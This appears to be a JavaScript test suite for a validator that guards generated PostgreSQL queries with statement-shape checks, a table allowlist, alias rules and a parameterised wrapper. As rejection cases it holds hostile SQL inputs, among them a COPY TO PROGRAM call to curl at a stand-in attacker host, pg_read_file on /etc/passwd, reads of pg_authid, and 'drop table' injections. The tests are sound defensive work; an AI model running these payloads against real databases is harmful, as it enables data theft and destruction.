/* global describe, it */

import * as chai from 'chai'

import validate_generated_sql, {
  truncate_identifier,
  quote_output_identifier
} from '#libs-server/data-views/generation/validate-generated-sql.mjs'
import { build_wrapped_query } from '#libs-server/data-views/generation/execute-generated-sql.mjs'

const expect = chai.expect

// A narrow, explicit allowlist so these tests assert the RULE rather than
// whatever the schema happens to hold today.
const allowlist = new Set(['player', 'nfl_plays', 'player_gamelogs'])

const expect_rejection = async (sql_text, code) => {
  let thrown = null
  try {
    await validate_generated_sql({ sql_text, allowlist })
  } catch (error) {
    thrown = error
  }
  expect(thrown, `expected ${sql_text} to be rejected`).to.not.equal(null)
  expect(thrown.name).to.equal('GeneratedSqlRejection')
  expect(thrown.code).to.equal(code)
}

describe('DATA VIEW SQL guard', function () {
  describe('statement shape', function () {
    it('accepts a single aliased SELECT', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text: 'select pid as player_id from player',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['player_id'])
    })

    it('rejects a second statement in the same string', async function () {
      await expect_rejection(
        'select pid as a from player; drop table player',
        'multi_statement'
      )
    })

    it('rejects a non-SELECT top-level statement', async function () {
      await expect_rejection(
        "copy player to program 'curl evil.example'",
        'not_a_select'
      )
    })

    it('rejects a write hidden at CTE depth', async function () {
      await expect_rejection(
        'with a as (with b as (insert into player (pid) values (1) returning pid) ' +
          'select pid as p from b) select p as q from a',
        'forbidden_statement'
      )
    })

    it('rejects a DELETE nested four CTE levels down', async function () {
      await expect_rejection(
        'with a as (with b as (with c as (delete from player returning pid) ' +
          'select pid as p from c) select p as q from b) select q as r from a',
        'forbidden_statement'
      )
    })

    it('rejects FOR UPDATE, which is a lockingClause and not a node type', async function () {
      await expect_rejection(
        'select pid as a from player for update',
        'locking_clause'
      )
    })

    it('rejects SELECT ... INTO, which is a SelectStmt carrying an intoClause', async function () {
      await expect_rejection(
        'select pid as a into exfiltrated from player',
        'into_clause'
      )
    })
  })

  describe('relation allowlist', function () {
    it('rejects a table that is not allowlisted', async function () {
      await expect_rejection(
        'select id as a from users',
        'relation_not_allowlisted'
      )
    })

    it('rejects a non-allowlisted table inside a subquery', async function () {
      await expect_rejection(
        'select pid as a from player where pid in (select id from users)',
        'relation_not_allowlisted'
      )
    })

    it('rejects pg_stat_statements, which no GRANT can deny', async function () {
      // pg_stat_statements is granted to PUBLIC, so the role's GRANTs cannot
      // stop this one. It is the single case where the parser is the only
      // control, which is why the parse-time allowlist exists at all.
      await expect_rejection(
        'select query as q from pg_stat_statements',
        'relation_not_allowlisted'
      )
    })

    it('rejects a set-returning function in FROM', async function () {
      await expect_rejection(
        "select x as a from pg_read_file('/etc/passwd') x",
        'range_function'
      )
    })

    it('rejects a schema other than public', async function () {
      await expect_rejection(
        'select a as x from pg_catalog.pg_authid a',
        'forbidden_schema'
      )
    })

    it('accepts a CTE name, which is a RangeVar indistinguishable from a table', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text:
          'with recent as (select pid as pid from player) select pid as p from recent',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['p'])
    })
  })

  describe('alias contract', function () {
    it('rejects an unaliased output column', async function () {
      await expect_rejection(
        'select pid from player',
        'unaliased_output_column'
      )
    })

    it('rejects a duplicate alias', async function () {
      await expect_rejection(
        'select pid as a, pid as a from player',
        'duplicate_output_alias'
      )
    })

    it('rejects a bare star', async function () {
      await expect_rejection('select * from player', 'star_projection')
    })

    it('rejects a qualified star', async function () {
      await expect_rejection('select p.* from player p', 'star_projection')
    })

    // The three shapes below are the ones a naive walk FAILS OPEN on. Each was
    // measured against libpg-query during planning, and each would otherwise
    // pass unchecked -- which is why they are named individually rather than
    // folded into one "rejects bad aliases" case.

    it('FAIL-OPEN 1: recurses into set-operation arms, which carry no top-level targetList', async function () {
      await expect_rejection(
        'select pid as a from player union select pid from player',
        'unaliased_output_column'
      )
    })

    it('FAIL-OPEN 1: recurses into NESTED set operations', async function () {
      await expect_rejection(
        'select pid as a from player union (select pid as a from player ' +
          'except select pid from player)',
        'unaliased_output_column'
      )
    })

    it('FAIL-OPEN 2: rejects a bare VALUES list, which has neither targetList nor arms', async function () {
      await expect_rejection('values (1, 2)', 'values_list')
    })

    it('FAIL-OPEN 2: rejects a VALUES list appearing as a set-operation arm', async function () {
      await expect_rejection(
        'select pid as a from player union values (1)',
        'values_list'
      )
    })

    it('FAIL-OPEN 3: reads larg / rarg as BARE bodies, so a legal UNION still passes', async function () {
      // The positive half of the bare-body shape: reading `node.larg.SelectStmt`
      // yields undefined and fails open. A walk that reads the bare body sees
      // both arms, so this legal statement passes and the illegal ones above do
      // not -- one without the other proves nothing.
      const { output_aliases } = await validate_generated_sql({
        sql_text:
          'select pid as a from player union all select pid as a from player',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['a'])
    })

    it('rejects two aliases that collide only after 63-byte truncation', async function () {
      const prefix = 'x'.repeat(63)
      await expect_rejection(
        `select pid as "${prefix}aaa", pid as "${prefix}bbb" from player`,
        'duplicate_output_alias'
      )
    })

    it('accepts two aliases distinguishable within 63 bytes', async function () {
      // The control for the truncation rule: it must not reject every long
      // alias pair, only the pair that collides.
      const prefix = 'x'.repeat(60)
      const { output_aliases } = await validate_generated_sql({
        sql_text: `select pid as "${prefix}aaa", pid as "${prefix}bbb" from player`,
        allowlist
      })
      expect(output_aliases).to.have.length(2)
      expect(output_aliases[0]).to.not.equal(output_aliases[1])
    })

    it('treats quoted aliases differing only in case as distinct', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text: 'select pid as "Alpha", pid as "alpha" from player',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['Alpha', 'alpha'])
    })
  })

  // A guard that rejects everything is not passing. These four are the shapes
  // node-sql-parser could not handle and libpg-query can, and they are the
  // reason the sandbox is worth having.
  describe('legitimate complex SQL is still accepted', function () {
    it('accepts a lateral join', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text:
          'select p.pid as a, g.total as b from player p, ' +
          'lateral (select count(*) as total from player_gamelogs) g',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['a', 'b'])
    })

    it('accepts a window function', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text:
          'select pid as a, row_number() over (order by pid) as rank from player',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['a', 'rank'])
    })

    it('accepts a FILTER aggregate', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text:
          'select count(*) filter (where pid is not null) as counted from player',
        allowlist
      })
      expect(output_aliases).to.deep.equal(['counted'])
    })

    it('accepts jsonb operators', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text: `select ('{"a":1}'::jsonb) -> 'a' as extracted from player`,
        allowlist
      })
      expect(output_aliases).to.deep.equal(['extracted'])
    })
  })

  describe('identifier handling', function () {
    it('truncates to 63 bytes without splitting a multibyte character', function () {
      const name = 'é'.repeat(40) // 80 bytes
      const truncated = truncate_identifier(name)
      expect(Buffer.from(truncated, 'utf8').length).to.be.at.most(63)
      expect(truncated).to.not.include('�')
    })

    it('escapes a doubled double-quote in an alias', function () {
      expect(quote_output_identifier('we"ird')).to.equal('"we""ird"')
    })

    it('carries an alias containing a quote through to the outer ORDER BY escaped', async function () {
      const { output_aliases } = await validate_generated_sql({
        sql_text: 'select pid as "we""ird" from player',
        allowlist
      })
      const { query_string } = build_wrapped_query({
        sql_text: 'select pid as "we""ird" from player',
        output_aliases,
        sort: [{ column_id: 'we"ird', desc: true }]
      })
      expect(query_string).to.include('ORDER BY "we""ird" DESC')
    })
  })

  describe('outer wrapper', function () {
    const output_aliases = ['a', 'b']
    const sql_text = 'select pid as a, pid as b from player'

    it('refuses a filter on a column the statement does not project', function () {
      expect(() =>
        build_wrapped_query({
          sql_text,
          output_aliases,
          where: [{ column_id: 'not_projected', operator: '=', value: 1 }]
        })
      ).to.throw(/not projected/)
    })

    it('refuses an unsupported operator', function () {
      expect(() =>
        build_wrapped_query({
          sql_text,
          output_aliases,
          where: [
            { column_id: 'a', operator: '; drop table player --', value: 1 }
          ]
        })
      ).to.throw(/unsupported filter operator/)
    })

    it('binds filter values rather than interpolating them', function () {
      const { query_string, bindings } = build_wrapped_query({
        sql_text,
        output_aliases,
        where: [
          { column_id: 'a', operator: '=', value: "'; drop table player --" }
        ]
      })
      expect(query_string).to.include('WHERE "a" = ?')
      expect(query_string).to.not.include('drop table')
      expect(bindings).to.deep.equal(["'; drop table player --"])
    })

    it('caps the outer LIMIT at the hard row cap', function () {
      const { query_string } = build_wrapped_query({
        sql_text,
        output_aliases,
        limit: 1000000
      })
      expect(query_string).to.include('LIMIT 10000')
    })
  })
})
